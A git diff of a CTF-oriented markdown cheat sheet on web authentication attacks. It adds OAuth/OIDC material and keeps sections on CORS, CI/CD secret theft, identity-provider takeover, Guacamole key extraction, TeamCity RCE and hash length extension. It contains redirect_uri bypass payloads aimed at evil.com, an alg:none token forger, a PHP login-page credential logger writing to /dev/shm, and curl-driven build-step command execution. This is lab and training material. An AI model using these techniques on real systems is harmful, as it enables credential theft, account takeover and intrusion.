@@ -1,7 +1,6 @@
 # CTF Web - OAuth, SAML & Infrastructure Auth Attacks
 
 ## Table of Contents
-
 - [OAuth/OIDC Exploitation](#oauthoidc-exploitation)
   - [Open Redirect Token Theft](#open-redirect-token-theft)
   - [OIDC ID Token Manipulation](#oidc-id-token-manipulation)
@@ -19,12 +18,58 @@
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For general auth bypass and access control, see [auth-and-access.md](auth-and-access.md).
 
-------
+## Modern OAuth/OIDC & Infra Additions (2025/2026)
+
+### OAuth email canonicalization and alias confusion
+
+The app may treat `alice+debug@example.com` as a separate identity while the provider normalizes it to the same account. This is especially common with Gmail and other providers that transform plus-addressing or case-folded addresses.
+
+**Check:**
+- compare raw tokens and server-side user records
+- ensure `sub`/`oid` is the canonical identity, not email text
+- test multiple aliases before trusting `email` as the unique identifier
+
+### `redirect_uri` exact-match bypasses
+
+A surprising number of SSO bugs are caused by weak redirect validation rather than improper token signing. A common bypass is accepting a callback that differs only by hostname, path normalization, or a subdomain suffix.
+
+**Typical payloads:**
+- `https://target.com/callback/../evil.com`
+- `https://target.com.evil.com`
+- double-encoded host components
+- path traversal or percent-encoded backslash tricks
+
+**Best practice:** compare the canonicalized redirect URL against an exact allowlist of origin/path pairs, not a prefix or suffix check.
+
+### State and nonce reuse across tenants
+
+If a backend accepts `state` or `nonce` without tying it to a specific `client_id`, browser session, or login challenge, then an attacker can replay one session's SSO callback in another request context.
+
+**Look for:**
+- callback accepted even when `client_id` differs
+- same `state` value reused across multiple login attempts
+- `nonce` present but not bound to a specific session or redirect URI
+
+### IdP API takeover via service-account tokens
+
+A service account or admin token used by the identity provider may be stored in CI/CD variables, application configs, or backup files. If reachable, it can be used to modify user registration, password resets, MFA state, and even SAML assertion generation.
+
+**Quick checks:**
+- inspect CI/CD variables, Git history, and config files for OIDC/IdP credentials
+- enumerate admin APIs for user management and password reset endpoints
+- see whether MFA has `not_configured_action: skip`
+
+### SAML and OIDC callback poisoning
+
+The callback may be missing or ignoring `RelayState`, `session_state`, or `state` on the final redirect. This lets the attacker chain a valid login response into a different user or tenant context.
+
+**Defensive guidance:** bind all callback parameters to the original request and compare them exactly before issuing a session.
+
+---
 
 ## OAuth/OIDC Exploitation
 
 ### Open Redirect Token Theft
-
 ```python
 # OAuth authorization with redirect_uri manipulation
 # If redirect_uri validation is weak, steal tokens via open redirect
@@ -49,7 +94,6 @@ params = {
 ```
 
 ### OIDC ID Token Manipulation
-
 ```python
 # If server accepts unsigned tokens (alg: none)
 import jwt, json, base64
@@ -68,7 +112,6 @@ forged = f"{new_header.decode()}.{new_payload.decode()}."
 ```
 
 ### OAuth State Parameter CSRF
-
 ```python
 # Missing or predictable state parameter allows CSRF
 # Attacker initiates OAuth flow, captures callback URL with auth code
@@ -82,7 +125,7 @@ forged = f"{new_header.decode()}.{new_payload.decode()}."
 
 **Key insight:** OAuth/OIDC (OpenID Connect) attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
 
-------
+---
 
 ## CORS Misconfiguration
 
@@ -118,12 +161,11 @@ fetch('https://target.com/api/user/profile', {
 
 **Key insight:** CORS (Cross-Origin Resource Sharing) is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
 
-------
+---
 
 ## Git History Credential Leakage (Barrier HTB)
 
 Secrets removed in later commits remain in git history. Search the full diff history for deleted credentials:
-
 ```bash
 git log --all --oneline
 git show <first_commit>
@@ -133,12 +175,11 @@ git log -p --all -S "password"
 
 **Key insight:** `git log -p --all -S "keyword"` searches every commit diff for any string, including deleted secrets. Always check first commits and removed files.
 
-------
+---
 
 ## CI/CD Variable Credential Theft (Barrier HTB)
 
 CI/CD (Continuous Integration/Continuous Deployment) variable settings store secrets (API tokens, passwords) readable by project admins. These are often admin-level tokens for connected services (authentik, Vault, AWS).
-
 ```bash
 # GitLab: Settings -> CI/CD -> Variables (visible to project admins)
 # GitHub: Settings -> Secrets and variables -> Actions
@@ -147,14 +188,13 @@ CI/CD (Continuous Integration/Continuous Deployment) variable settings store sec
 
 **Key insight:** CI/CD variables frequently contain service account tokens with elevated privileges. A GitLab project admin can read all CI/CD variables, which may include tokens for identity providers, secret stores, or cloud platforms.
 
-------
+---
 
 ## Identity Provider API Takeover (Barrier HTB)
 
 Exploits an admin API token for identity providers (authentik, Keycloak, Okta) to take over any user account.
 
 **Attack chain:**
-
 1. Enumerate users: `GET /api/v3/core/users/`
 2. Set target user's password: `POST /api/v3/core/users/{pk}/set_password/`
 3. Check authentication flow stages — if MFA (Multi-Factor Authentication) has `not_configured_action: skip`, it auto-skips when no MFA devices are configured
@@ -162,14 +202,13 @@ Exploits an admin API token for identity providers (authentik, Keycloak, Okta) t
 
 **Key insight:** Identity provider admin tokens are the keys to the kingdom. If MFA stages have `not_configured_action: skip`, setting a user's password is sufficient for full account takeover — no MFA bypass needed.
 
-------
+---
 
 ## SAML SSO Flow Automation (Barrier HTB)
 
 Automates SAML (Security Assertion Markup Language) SSO login for services like Guacamole or internal apps when you control IdP (Identity Provider) credentials.
 
 **Steps:**
-
 1. Start login flow at the service — capture `SAMLRequest` + `RelayState` from the redirect
 2. Authenticate with IdP (via API or session)
 3. Submit IdP's signed `SAMLResponse` + original `RelayState` to service callback
@@ -177,12 +216,11 @@ Automates SAML (Security Assertion Markup Language) SSO login for services like 
 
 **Key insight:** Preserve `RelayState` through the entire flow — it correlates the callback with the login request. Mismatched `RelayState` causes authentication failure even with a valid `SAMLResponse`.
 
-------
+---
 
 ## Apache Guacamole Connection Parameter Extraction (Barrier HTB)
 
 Apache Guacamole stores SSH keys, passwords, and connection details in MySQL. Extract them with DB access or an authenticated API token:
-
 ```bash
 # Via API with auth token
 curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
@@ -198,12 +236,11 @@ JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;
 
 **Key insight:** Guacamole connection parameters contain plaintext SSH private keys and passphrases. A single API token or database access exposes credentials for every managed host.
 
-------
+---
 
 ## Login Page Poisoning for Credential Harvesting (Watcher HTB)
 
 Injects a credential logger into the web app login page to capture plaintext passwords:
-
 ```php
 // Add after successful login check in index.php:
 $f = fopen('/dev/shm/creds.txt', 'a+');
@@ -215,12 +252,11 @@ Wait for automated logins (bots, cron scripts). Check audit logs for frequently-
 
 **Key insight:** `/dev/shm/` is a tmpfs mount writable by any user and invisible to most monitoring. Automated services (backup scripts, health checks) often authenticate with elevated credentials on predictable schedules.
 
-------
+---
 
 ## TeamCity REST API RCE (Watcher HTB)
 
 Exploits TeamCity admin credentials to achieve RCE (Remote Code Execution) through build step injection:
-
 ```bash
 # 1. Create project
 curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
@@ -251,7 +287,7 @@ curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
 
 **Key insight:** If build agent runs as root, all build steps execute as root. Check `ps aux` for build agent process ownership. TeamCity REST API provides full project/build management — admin credentials = RCE.
 
-------
+---
 
 ## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)
 
@@ -269,7 +305,7 @@ Server RSA-signs an order string, then parses `&`-separated parameters. Python's
 
 **Key insight:** Gap between what is signed (pre-signature content) and what is parsed (full string including post-signature data), enabled by base64's tolerance for non-alphabet characters. Any system that concatenates signed data with unsigned parameters and uses lenient base64 decoding is vulnerable. Defense: validate signature over the exact bytes being parsed, not a subset.
 
-------
+---
 
 ## Hash Length Extension Attack (ASIS CTF 2017)
 
@@ -322,11 +358,9 @@ for length in range(1, 101):
 ```
 
 **Padding structure:** Between the original message and the extension, the hash algorithm inserts its standard padding:
-
 ```text
 original_msg || 0x80 || 0x00...0x00 || length_in_bits (8 bytes big-endian)
 ```
-
 This padding is part of `new_msg` — the server will verify it as-is.
 
 **Vulnerable algorithms:** MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512 (all Merkle-Damgård). **Not vulnerable:** HMAC (uses two separate hash passes), SHA-3/Keccak (sponge construction), BLAKE2/3.
